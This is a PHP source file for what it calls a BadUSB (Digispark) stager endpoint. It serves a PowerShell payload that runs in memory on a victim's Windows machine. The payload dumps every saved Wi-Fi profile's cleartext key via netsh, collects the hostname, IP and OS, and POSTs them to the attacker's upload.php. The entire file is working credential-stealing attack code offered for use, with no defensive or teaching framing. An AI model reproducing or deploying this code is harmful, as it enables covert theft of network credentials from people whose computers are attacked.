<?php
/**
 * Dynamic PowerShell stager endpoint for Digispark (BadUSB)
 * Serves optimized PowerShell payload directly into memory (IEX)
 * and automatically exits / closes process on finish.
 */
header('Content-Type: text/plain; charset=utf-8');

$token = trim($_GET['t'] ?? '');
if ($token === '') {
    echo 'exit';
    exit;
}

$host  = $_SERVER['HTTP_HOST'];
// Cloudflare or reverse proxy might set HTTP internally, so force https if on public domain
$proto = (strpos($host, 'localhost') !== false || strpos($host, '127.0.0.1') !== false) ? 'http' : 'https';
$uploadUrl = "{$proto}://{$host}/upload.php?token=" . urlencode($token);
?>
$u = '<?php echo $uploadUrl; ?>'
try {
    (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
        $s = $_.Matches.Groups[1].Value.Trim()
        if ($s -and $s -notmatch '^(profile_name|myssid|test)$') {
            $k = ((netsh wlan show profile name="$s" key=clear) | Select-String 'Key Content\s*:\s*(.+)$').Matches.Groups[1].Value
            if (-not $k) { $k = '(Not Found)' }
            $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -ExpandProperty IPAddress -First 1)
            if (-not $ip) { $ip = 'offline' }
            $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            if (-not $os) { $os = 'Windows' }
            $b = "$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$ip,$os"
            try { Invoke-RestMethod -Uri $u -Method POST -Body $b -TimeoutSec 4 } catch {}
        }
    }
} catch {}
exit
